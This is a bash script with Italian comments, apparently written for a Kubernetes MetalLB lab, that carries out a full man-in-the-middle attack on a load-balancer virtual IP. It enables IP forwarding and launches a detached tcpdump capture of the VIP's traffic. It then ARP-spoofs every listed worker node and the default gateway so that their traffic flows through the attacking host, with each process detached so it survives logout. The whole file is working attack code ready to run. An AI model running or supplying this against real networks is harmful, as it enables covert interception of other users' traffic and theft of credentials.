#!/usr/bin/env bash
set -euo pipefail

# Usage:
#   ./mitm_metalLB.sh /path/to/ip-hosts.txt
#
# File formattato a righe: "IP - HOST"
# Esempi:
#   172.18.0.5 - mitm-lab-worker
#   172.18.0.6 - mitm-lab-worker2
#   172.18.1.200 - metallb-vip
#
# Note:
# - VIP: unico IP nel file dentro 172.18.1.0/24
# - Worker: tutte le righe con "worker" nel campo HOST
# - tcpdump: staccato e scrive in /tmp/node_traffic (pcap)
# - arpspoof: lanciato verso ogni worker e verso il gateway per il VIP
# - Interfaccia: autodetect sul path verso il VIP

INPUT_FILE="${INPUT_FILE:-/tmp/iphost}"
VIP="${LOAD_BALANCER_IP:-172.18.0.200}"
TCPDUMP_OUT="/tmp/node_traffic"
TCPDUMP_LOG="/tmp/tcpdump_stdout_err.log"

if [[ -z "${INPUT_FILE}" || ! -f "${INPUT_FILE}" ]]; then
  echo "Uso: $0 /path/to/ip-hosts.txt" >&2
  exit 1
fi

# Estrai tutti gli IP (prima colonna del file) e rimuovi duplicati
mapfile -t WORKERS < <(awk -F' - ' '{print $1}' "${INPUT_FILE}" | sort -u)
#mapfile -t WORKERS < <(awk -F' - ' '{ip=$1; host=$2} host ~ /worker/ {print ip}' "${INPUT_FILE}" | sort -u)
if [[ "${#WORKERS[@]}" -eq 0 ]]; then
  echo "ERRORE: nessun worker trovato (HOST contenente 'worker')." >&2
  exit 1
fi

# Ricava gateway di default
GATEWAY="$(ip route | awk '/^default/ {print $3; exit}')"
if [[ -z "${GATEWAY}" ]]; then
  echo "ERRORE: gateway di default non trovato." >&2
  exit 1
fi

# Interfaccia usata per raggiungere il VIP
IFACE="$(ip -o route get "${VIP}" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="dev") {print $(i+1); exit}}')"
IFACE="${IFACE:-eth0}"

echo "[*] VIP            : ${VIP}"
echo "[*] Workers       : ${WORKERS[*]}"
echo "[*] Gateway       : ${GATEWAY}"
echo "[*] Interfaccia   : ${IFACE}"

# Abilita IP forwarding per non interrompere il traffico
echo "[*] Abilito IPv4 forwarding"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

if pgrep -f "tcpdump .* ${VIP}" >/dev/null 2>&1; then
  echo "[*] tcpdump sembra già in esecuzione per ${VIP} (lo lascio stare)."
else
  echo "[*] Avvio tcpdump staccato: ${TCPDUMP_OUT}"
  # setsid + redirezione per staccarlo dalla shell (rimane attivo anche se chiudi la sessione)
  setsid tcpdump -i "${IFACE}" -n host "${VIP}" -w "${TCPDUMP_OUT}" \
      >"${TCPDUMP_LOG}" 2>&1 < /dev/null &
  sleep 1
fi

# Avvia ARP spoof verso tutti i worker e verso il gateway
#   -t <target> VIP   → convince il target che il VIP ha il nostro MAC
PIDS=()

echo "[*] Avvio arpspoof verso i worker per VIP ${VIP}"
for NODE in "${WORKERS[@]}"; do
  echo "    - worker ${NODE}"
  setsid arpspoof -i "${IFACE}" -t "${NODE}" "${VIP}" >/dev/null 2>&1 < /dev/null &
  PIDS+=("$!")
done

echo "[*] Avvio arpspoof verso il gateway ${GATEWAY} per VIP ${VIP}"
setsid arpspoof -i "${IFACE}" -t "${GATEWAY}" "${VIP}" >/dev/null 2>&1 < /dev/null &
PIDS+=("$!")

echo
echo "[*] MITM attivo."
echo "    - pcap: ${TCPDUMP_OUT}"
echo "    - log tcpdump: ${TCPDUMP_LOG}"
echo

